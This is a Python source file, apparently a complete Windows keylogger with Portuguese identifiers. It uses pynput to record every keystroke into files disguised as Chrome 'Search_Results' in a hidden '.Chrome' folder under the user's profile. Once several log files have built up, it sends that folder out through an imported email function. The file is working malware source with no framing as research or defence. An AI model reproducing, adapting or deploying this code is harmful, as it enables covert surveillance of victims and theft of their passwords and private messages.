from pynput import keyboard
from os.path import exists
from os import getlogin, mkdir, walk, rename
from Email import enviar

def verificação():

    user = getlogin()

    if not exists(f'C:\\Users\\{user}\\.Chrome'):
        mkdir(f'C:\\Users\\{user}\\.Chrome')

    if not exists(f'C:\\Users\\{user}\\.Chrome\\Search_Results_1'):
        f = open(f'C:\\Users\\{user}\\.Chrome\\Search_Results_1', 'w', encoding='utf-8')
        f.close()

    cont = 0

    numero_de_caracteres = 1

    for root, dirs, files in walk(f'C:\\Users\\{user}\\.Chrome', topdown=False):
        for file in files:
            cont+=1
    if cont >= 2:
        enviar(f'C:\\Users\\{user}\\.Chrome\\')
    f = open(f'C:\\Users\\{user}\\.Chrome\\Search_Results_{cont}', 'r', encoding='utf-8')
    
    for el in f.read():
        numero_de_caracteres+=1
    
    f.close()
    
    if numero_de_caracteres >= 1000:
        numeraçao_arquivo = cont + 1
        f = open(f'C:\\Users\\{user}\\.Chrome\\Search_Results_{numeraçao_arquivo}', 'w', encoding='utf-8')
        f.close()
    
    return cont, user    


def on_press(key):
    
    cont, user = verificação()
    
    try:
        f = open(f'C:\\Users\\{user}\\.Chrome\\Search_Results_{cont}', 'a', encoding='utf-8')
        f.write(f'{str(key.char)}')
        f.close()
    except AttributeError:
        if key ==  keyboard.Key.space:
            f = open(f'C:\\Users\\{user}\\.Chrome\\Search_Results_{cont}', 'a', encoding='utf-8')
            f.write(' ')
            f.close()
        else:
            f = open(f'C:\\Users\\{user}\\.Chrome\\Search_Results_{cont}', 'a', encoding='utf-8')
            f.write(f'{str(key)}')
            f.close()



with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

